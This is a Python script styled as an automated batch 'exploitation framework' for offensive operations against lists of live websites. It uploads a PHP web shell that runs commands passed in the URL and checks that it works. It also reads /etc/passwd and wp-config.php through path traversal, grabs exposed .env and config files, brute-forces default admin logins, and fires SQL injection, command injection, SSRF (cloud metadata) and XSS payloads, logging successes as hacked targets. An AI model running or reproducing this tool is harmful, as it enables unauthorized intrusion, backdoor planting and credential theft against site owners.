#!/usr/bin/env python3
"""
SSSXDERA AUTOMATED EXPLOITATION FRAMEWORK v3.2.0 (BATCH EDITION)
========================================================================
PURPOSE: Advanced Cyber Offensive Operations
AUTHOR: Shirokami Sotora | xDera Network
LICENSE: FOR AUTHORIZED USE ONLY
========================================================================
"""

import requests
import sys
import threading
import random
import string
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
import os
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "3.2.0"
AUTHOR = "Shirokami Sotora | xDera Network"
PURPOSE = "Advanced Cyber Offensive Operations"
YEAR = datetime.now().year

class Col:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

TIMEOUT = 10
MAX_REQUESTS_SAFETY = 100
HACKED_LOG_FILE = "report.txt"

class CVSS_Calculator:
    """Simple CVSS v3.1 calculator"""
    @staticmethod
    def calculate(impact):
        if impact == 'CRITICAL': return 9.8
        if impact == 'HIGH': return 7.5
        if impact == 'MEDIUM': return 5.3
        return 0.0

    @staticmethod
    def get_severity(score):
        if score >= 9.0: return f"{Col.RED}CRITICAL{Col.RESET}"
        if score >= 7.0: return f"{Col.RED}HIGH{Col.RESET}"
        if score >= 4.0: return f"{Col.YELLOW}MEDIUM{Col.RESET}"
        return f"{Col.GREEN}LOW{Col.RESET}"

class AutoPwnAcademic:
    def __init__(self, target):
        self.target = target
        self.findings = [] 
        self.request_count = 0
        self.tech_stack = ['Unknown']
        self.start_time = datetime.now()
        self.shell_uploaded_path = None
        
        self.owasp_map = {
            'Unrestricted File Upload': 'A03:2021-Injection',
            'Local File Inclusion (LFI)': 'A03:2021-Injection',
            'Sensitive Data Exposure': 'A05:2021-Security Misconfig',
            'Weak Credentials (Admin)': 'A07:2021-Identification Failures',
            'SQL Injection': 'A03:2021-Injection',
            'Command Injection': 'A03:2021-Injection',
            'Server-Side Request Forgery (SSRF)': 'A10:2021-SSRF',
            'Reflected Cross-Site Scripting (XSS)': 'A07:2021-Identification Failures'
        }
        
        if not self.target.startswith("http"):
            self.target = "http://" + self.target
        self.target = self.target.rstrip('/')
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': f'Mozilla/5.0 (SSSXDERA/{VERSION}; Offensive)',
            'X-Scanner-Id': 'SSSXDERA-Exploitation-01'
        })
        self.shell_name = "xdera.php"

    def show_progress(self, current, total, desc=""):
        bar_len = 30
        filled_len = int(bar_len * current // total)
        bar = '█' * filled_len + '░' * (bar_len - filled_len)
        percent = 100 * current // total
        sys.stdout.write(f'\r[{Col.RED}{bar}{Col.RESET}] {percent}% {desc}')
        sys.stdout.flush()
        if current == total: print()

    def show_scanning_animation(self):
        frames = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", 
                  "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", 
                  "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
        print(f"\n{Col.RED}[*] Initiating Cyber Offensive...{Col.RESET}")
        for frame in frames:
            sys.stdout.write(f"\r{frame} Breaching Defenses...")
            sys.stdout.flush()
            time.sleep(0.12)
        print()

    def show_impact_graphic(self):
        if self.findings:
            print(f"""
{Col.RED}
    ┌─────────────────────┐
    │  CRITICAL BREACH    │
    │  DETECTED!          │
    └─────────────────────┘
{Col.RESET}
            """)
        else:
            print(f"""
{Col.GREEN}
    ┌─────────────────────┐
    │  NO CRITICAL        │
    │  VULNERABILITIES    │
    └─────────────────────┘
{Col.RESET}
            """)

    def safe_request(self, method, url, **kwargs):
        if self.request_count >= MAX_REQUESTS_SAFETY: 
            print(f"{Col.YELLOW}[!] Max request safety reached for {self.target}. Skipping further requests.{Col.RESET}")
            return None
        self.request_count += 1
        try:
            return self.session.request(method, url, verify=False, timeout=TIMEOUT, **kwargs)
        except requests.exceptions.RequestException as e: 
            return None
        except Exception as e:
            return None

    def detect_technology(self):
        print(f"\n{Col.BLUE}[*] Phase 0: Reconnaissance & Fingerprinting...{Col.RESET}")
        tech_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'WordPress'],
            'Joomla': ['joomla', 'com_content', 'Joomla!'],
            'Apache': ['Apache', 'Server: Apache'],
            'Nginx': ['nginx', 'Server: nginx'],
            'PHP': ['X-Powered-By: PHP', '.php']
        }
        res = self.safe_request('GET', self.target)
        detected = []
        if res:
            if res.text:
                for tech, sigs in tech_signatures.items():
                    if any(sig in res.text or sig in res.headers.get('Server', '') or sig in res.headers.get('X-Powered-By', '') for sig in sigs):
                        detected.append(tech)
            else:
                for tech, sigs in tech_signatures.items():
                     if any(sig in res.headers.get('Server', '') or sig in res.headers.get('X-Powered-By', '') for sig in sigs):
                        detected.append(tech)
        
        self.tech_stack = detected if detected else ['Custom/Unknown']
        print(f"    -> Detected: {Col.BOLD}{', '.join(self.tech_stack)}{Col.RESET}")
        return self.tech_stack

    def run_upload_method(self):
        score = CVSS_Calculator.calculate('CRITICAL')
        severity = CVSS_Calculator.get_severity(score)
        
        shell_content = f"<?php echo 'SSSXDERA SHELL - HACKED: {self.target}'; system($_GET['c']); ?>"
        files = {'file': (self.shell_name, shell_content)}
        
        endpoints = ['/upload.php', 
                     '/wp-content/plugins/revslider/temp/update_extract/revslider/asset_server/upload.php',
                     '/wp-content/uploads/', '/images/', '/img_upload.php', '/admin/upload.php', '/attachments/',
                     '/wp-admin/admin-ajax.php?action=upload-theme', 
                     '/wp-admin/media-new.php'
                     ]
        
        for ep in endpoints:
            full_url = self.target + ep
            res = self.safe_request('POST', full_url, files=files)
            if res and res.status_code in [200, 201] and ("success" in res.text.lower() or self.shell_name in res.text.lower() or "uploaded" in res.text.lower()):
                shell_test_url = None
                if "/wp-content/plugins/revslider/" in ep:
                    shell_test_url = self.target + '/wp-content/uploads/revslider/' + self.shell_name
                elif "/wp-content/uploads/" in ep:
                    shell_test_url = self.target + ep + self.shell_name
                elif "/images/" in ep:
                    shell_test_url = self.target + ep + self.shell_name
                elif "/attachments/" in ep:
                    shell_test_url = self.target + ep + self.shell_name
                elif "/wp-admin/admin-ajax.php" in ep:
                    shell_test_url = self.target + '/wp-content/uploads/' + self.shell_name
                else:
                    shell_test_url = self.target + ep.rsplit('/', 1)[0] + '/' + self.shell_name if ep.endswith('/') else full_url.replace('.php', '') + '/' + self.shell_name
                    if shell_test_url == full_url:
                        shell_test_url = full_url

                if shell_test_url:
                    check_res = self.safe_request('GET', shell_test_url + "?c=echo 'AMAGI_TEST';")
                    if check_res and "AMAGI_TEST" in check_res.text:
                        self.findings.append({
                            'vuln': "Unrestricted File Upload",
                            'severity': f"{severity} ({score})",
                            'detail': f"Web shell uploaded and confirmed at {shell_test_url}",
                            'exploit_url': shell_test_url
                        })
                        self.shell_uploaded_path = shell_test_url
                        return True
        return False

    def run_lfi_method(self):
        score = CVSS_Calculator.calculate('HIGH')
        severity = CVSS_Calculator.get_severity(score)
        endpoints = [
            '/?page=../../../../etc/passwd', 
            '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
            '/index.php?file=../../../../etc/passwd',
            '/include.php?file=../../../../etc/passwd',
            '/view.php?page=../../../../etc/passwd',
            '/download.php?file=../../../../etc/passwd',
            '/wp-content/themes/twentyseventeen/inc/template-tags.php?file=../../../../etc/passwd'
        ]
        
        for ep in endpoints:
            exploit_url = self.target + ep
            res = self.safe_request('GET', exploit_url)
            if res and ("root:x:0:0" in res.text or "DB_PASSWORD" in res.text or "apache" in res.text or "usr/local" in res.text):
                self.findings.append({
                    'vuln': "Local File Inclusion (LFI)",
                    'severity': f"{severity} ({score})",
                    'detail': f"System file accessible at {ep}",
                    'exploit_url': exploit_url
                })
                return True
        return False

    def run_config_check(self):
        score = CVSS_Calculator.calculate('HIGH')
        severity = CVSS_Calculator.get_severity(score)
        files = ['/.git/config', '/wp-config.php.bak', '/.env', '/config.php', '/configuration.php',
                 '/web.config.bak', '/database.yml', '/config/database.yml', '/admin/config.php',
                 '/config/settings.php', '/db_config.php', '/_vti_pvt/service.pwd'
                 ]
        for f in files:
            exploit_url = self.target + f
            res = self.safe_request('GET', exploit_url)
            if res and res.status_code == 200 and len(res.text) > 50:
                if any(keyword in res.text.lower() for keyword in ['password', 'secret', 'db_host', 'db_user', 'api_key', 'connection_string']):
                    self.findings.append({
                        'vuln': "Sensitive Data Exposure",
                        'severity': f"{severity} ({score})",
                        'detail': f"Config exposed: {f}. Potential credentials/secrets.",
                        'exploit_url': exploit_url
                    })
                    return True
        return False

    def run_auth_bypass(self):
        score = CVSS_Calculator.calculate('HIGH')
        severity = CVSS_Calculator.get_severity(score)
        
        login_paths = ['/wp-login.php', '/admin/login.php', '/login.php', '/admin/', '/user/login',
                       '/login', '/auth/login', '/panel/login.php']
        creds = [('admin', 'admin'), ('admin', '123456'), ('root', 'toor'), ('test', 'test'), 
                 ('administrator', 'password'), ('admin', 'password'), ('user', 'user')]
        
        for login_path in login_paths:
            login_url = self.target + login_path
            for user, pwd in creds:
                data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In',
                        'username': user, 'password': pwd, 'submit': 'Login',
                        'user': user, 'pass': pwd
                        }
                res = self.safe_request('POST', login_url, data=data)
                if res and (res.status_code == 302 or "dashboard" in res.text.lower() or "welcome admin" in res.text.lower() or "logged in as" in res.text.lower()):
                    self.findings.append({
                        'vuln': "Weak Credentials (Admin)",
                        'severity': f"{severity} ({score})",
                        'detail': f"Login success: {user}:{pwd} at {login_url}"
                    })
                    return True
        return False

    def run_sql_injection(self):
        score = CVSS_Calculator.calculate('HIGH')
        severity = CVSS_Calculator.get_severity(score)
        
        test_params = ['id', 'cat', 'page', 'item', 'product_id', 'news_id']
        sql_payloads = [
            "'",
            "''",
            "' OR 1=1-- ",
            "') OR 1=1-- ",
            "ORDER BY 99-- ",
            "UNION SELECT 1,2,3-- "
        ]
        
        endpoints = ['/index.php', '/view.php', '/products.php', '/news.php', '/item.php']

        for endpoint in endpoints:
            for param in test_params:
                for payload in sql_payloads:
                    exploit_url = f"{self.target}{endpoint}?{param}=1{payload}" 
                    res = self.safe_request('GET', exploit_url)
                    if res and any(err in res.text for err in ['SQL syntax', 'mysql_fetch_array()', 'You have an error in your SQL syntax', 'Warning: PDOStatement::execute()']):
                        self.findings.append({
                            'vuln': "SQL Injection",
                            'severity': f"{severity} ({score})",
                            'detail': f"Error-based SQLi detected via parameter '{param}' with payload '{payload}' at {exploit_url}",
                            'exploit_url': exploit_url
                        })
                        return True
        return False
    
    def run_command_injection(self):
        score = CVSS_Calculator.calculate('CRITICAL')
        severity = CVSS_Calculator.get_severity(score)
        
        test_params = ['cmd', 'exec', 'command', 'query', 'host', 'ip']
        cmd_payloads = [
            "; id",
            "| id",
            "`id`",
            "&& id",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "|| id"
        ]
        
        endpoints = [
            '/ping.php',
            '/exec.php',
            '/diagnostics.php',
            '/tools/ping.php',
            '/admin/network.php'
        ]
        
        for endpoint in endpoints:
            for param in test_params:
                for payload in cmd_payloads:
                    exploit_url = f"{self.target}{endpoint}?{param}={urllib.parse.quote_plus(payload)}"
                    res = self.safe_request('GET', exploit_url)
                    if res and (("uid=" in res.text and "gid=" in res.text) or ("root:x:0:0" in res.text) or ("daemon:x" in res.text)):
                        self.findings.append({
                            'vuln': "Command Injection",
                            'severity': f"{severity} ({score})",
                            'detail': f"Command injection detected via parameter '{param}' with payload '{payload}' at {exploit_url}. Output: {res.text[:100]}...",
                            'exploit_url': exploit_url
                        })
                        return True
        return False

    def run_ssrf_check(self):
        score = CVSS_Calculator.calculate('HIGH')
        severity = CVSS_Calculator.get_severity(score)

        ssrf_params = ['url', 'src', 'link', 'image_url', 'file', 'callback', 'redirect']
        internal_targets = ['http://127.0.0.1/admin', 'http://localhost/server-status', 'file:///etc/passwd',
                            'http://169.254.169.254/latest/meta-data/']
        
        endpoints = [
            '/proxy.php',
            '/fetch_image.php',
            '/load_url.php',
            '/api/v1/ssrf_endpoint',
            '/image_loader',
            '/rss_feed_reader.php'
        ]

        for endpoint in endpoints:
            for param in ssrf_params:
                for target_url in internal_targets:
                    exploit_url = f"{self.target}{endpoint}?{param}={urllib.parse.quote_plus(target_url)}"
                    res = self.safe_request('GET', exploit_url)
                    if res and res.status_code == 200:
                        if "root:x:0:0" in res.text or "apache" in res.text or "server-status" in res.text.lower() or "admin dashboard" in res.text.lower() or "latest/meta-data" in res.text:
                            self.findings.append({
                                'vuln': "Server-Side Request Forgery (SSRF)",
                                'severity': f"{severity} ({score})",
                                'detail': f"SSRF detected via parameter '{param}' fetching '{target_url}' at {exploit_url}. Response contains sensitive info.",
                                'exploit_url': exploit_url
                            })
                            return True
        return False

    def run_xss_check(self):
        score = CVSS_Calculator.calculate('MEDIUM')
        severity = CVSS_Calculator.get_severity(score)

        xss_payload = "<script>alert('XSS_AMAGI_TEST')</script>"
        
        test_params = ['q', 'search', 'query', 'name', 'id', 'message', 'title']
        
        endpoints = [
            '/search.php',
            '/index.php',
            '/feedback.php',
            '/'
        ]

        for endpoint in endpoints:
            for param in test_params:
                exploit_url = f"{self.target}{endpoint}?{param}={urllib.parse.quote_plus(xss_payload)}"
                res = self.safe_request('GET', exploit_url)
                if res and xss_payload in res.text:
                    self.findings.append({
                        'vuln': "Reflected Cross-Site Scripting (XSS)",
                        'severity': f"{severity} ({score})",
                        'detail': f"Reflected XSS detected via parameter '{param}' with payload '{xss_payload}' at {exploit_url}",
                        'exploit_url': exploit_url
                    })
                    return True
        return False

def process_single_target(target):
    target = target.strip()
    if not target: return
    print(f"\n{Col.BOLD}{Col.CYAN}" + "="*50)
    print(f" TARGET: {target}")
    print("="*50 + f"{Col.RESET}")

    scanner = AutoPwnAcademic(target)

    scanner.detect_technology()
    scanner.show_scanning_animation()
    print("\nLaunching Exploitation Sequence...")
    
    methods = [
        ("Upload (RCE)", scanner.run_upload_method),
        ("LFI (Dropper)", scanner.run_lfi_method),
        ("Config Dump", scanner.run_config_check),
        ("Auth Bypass", scanner.run_auth_bypass),
        ("SQL Injection", scanner.run_sql_injection),
        ("Command Injection", scanner.run_command_injection),
        ("SSRF", scanner.run_ssrf_check),
        ("XSS", scanner.run_xss_check)
    ]
    
    total = len(methods)
    for i, (name, func) in enumerate(methods):
        scanner.show_progress(i, total, f"Running: {name}")
        func()
        time.sleep(0.2)
        
    scanner.show_progress(total, total, "Exploit Attempt Complete! ✓")
    scanner.show_impact_graphic()

    if scanner.findings:
        print(f"\n{Col.GREEN}[+] Logging all findings for {target} to {HACKED_LOG_FILE}{Col.RESET}")
        try:
            with open(HACKED_LOG_FILE, "a") as f:
                for finding in scanner.findings:
                    vuln_type = finding['vuln']
                    detail = finding['detail']
                    exploit_url = finding.get('exploit_url', 'N/A')
                    
                    log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] TARGET: {target} | VULNERABILITY: {vuln_type} | DETAIL: {detail} | URL: {exploit_url}\n"
                    f.write(log_entry)
            print(f"{Col.GREEN}[SUCCESS] All findings for {target} logged to {HACKED_LOG_FILE}{Col.RESET}")
        except Exception as e:
            print(f"{Col.RED}[ERROR] Could not write findings for {target} to {HACKED_LOG_FILE}: {e}{Col.RESET}")
    else:
        print(f"\n{Col.BLUE}[INFO] No vulnerabilities found for {target}. Nothing to log.{Col.RESET}")


def main():
    print(f"""
{Col.RED}
    SSSXDERA AUTOMATED EXPLOITATION FRAMEWORK v{VERSION}
    CYBER OFFENSIVE OPERATIONS
    Developed by Shrokami Sotora's System | xDera Network
    Connect With Us: https://xdera.my.id
{Col.RESET}
    """)
    print(f"{Col.CYAN}Version: {VERSION} | Mode: LIVE TARGET (Automated Offensive){Col.RESET}")
    
    input_source = input(f"Target URL or File (e.g., {Col.YELLOW}targets.txt{Col.RESET}): ").strip()
    
    targets = []
    if input_source.endswith(".txt"):
        try:
            with open(input_source, "r") as f:
                targets = [line.strip() for line in f.readlines() if line.strip()]
            print(f"\n{Col.BLUE}[INFO] Loaded {len(targets)} targets from {input_source}{Col.RESET}")
        except FileNotFoundError:
            print(f"\n{Col.RED}[!] File '{input_source}' not found! Exiting.{Col.RESET}")
            sys.exit(0)
    else:
        targets = [input_source]

    if not targets:
        print(f"\n{Col.RED}[!] No targets provided. Exiting.{Col.RESET}")
        sys.exit(0)

    start_all = datetime.now()
    for i, target in enumerate(targets):
        print(f"\nProcessing {i+1}/{len(targets)}...")
        process_single_target(target)
        if i < len(targets) - 1:
            print(f"\n{Col.YELLOW}Moving to next target in 2 seconds...{Col.RESET}")
            time.sleep(2)

    total_time = (datetime.now() - start_all).total_seconds()
    print(f"\n{Col.RED}{'='*60}")
    print(f"  BATCH OFFENSIVE COMPLETE")
    print(f"  Targets Engaged : {len(targets)}")
    print(f"  Total Duration: {total_time:.2f}s")
    print(f"  All findings logged to: {HACKED_LOG_FILE}")
    print(f"{'='*60}{Col.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Col.YELLOW}[!] Offensive interrupted by operator.{Col.RESET}")
    except Exception as e:
        print(f"\n{Col.RED}[!] Critical error during operation: {str(e)}{Col.RESET}")
        # import traceback
        # traceback.print_exc()
